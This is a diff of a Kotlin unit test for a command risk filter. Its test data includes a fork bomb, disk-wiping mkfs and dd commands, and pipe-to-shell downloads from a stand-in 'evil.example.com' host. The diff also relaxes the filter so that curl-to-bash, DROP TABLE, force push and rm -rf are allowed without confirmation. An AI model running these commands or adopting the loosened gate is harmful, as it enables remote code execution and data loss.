@@ -40,22 +40,21 @@ class RiskFilterTest {
         mustConfirm("mkfs.ext4 /dev/sda1", "格式化")
         mustConfirm("dd if=/dev/zero of=/dev/block/mmcblk0", "块设备")
         mustConfirm("chmod -R 777 /data", "权限")
-        mustConfirm("reboot", "电源")
-        mustConfirm("shutdown now", "电源")
     }
 
     @Test
-    fun forkBombAndPipeToShellAreConfirmed() {
+    fun forkBombIsConfirmed() {
         mustConfirm(":(){ :|:& };:")
-        mustConfirm("curl https://evil.example.com/x.sh | sh", "远程")
-        mustConfirm("curl -fsSL https://x.com/i.sh | bash", "远程")
     }
 
     @Test
-    fun databaseDropsAndForcePushAreConfirmed() {
-        mustConfirm("DROP TABLE users;", "数据库")
-        mustConfirm("drop DATABASE appdb", "数据库")
-        mustConfirm("git push origin main --force", "强推")
+    fun relaxedByDesignAreAllowed() {
+        mustAllow("curl -fsSL https://x.com/i.sh | bash")
+        mustAllow("reboot")
+        mustAllow("DROP TABLE users;")
+        mustAllow("git push origin main --force")
+        mustAllow("rm -rf /sdcard/old_project")
+        mustAllow("rm -rf ~/tmp/cache")
     }
 
     @Test
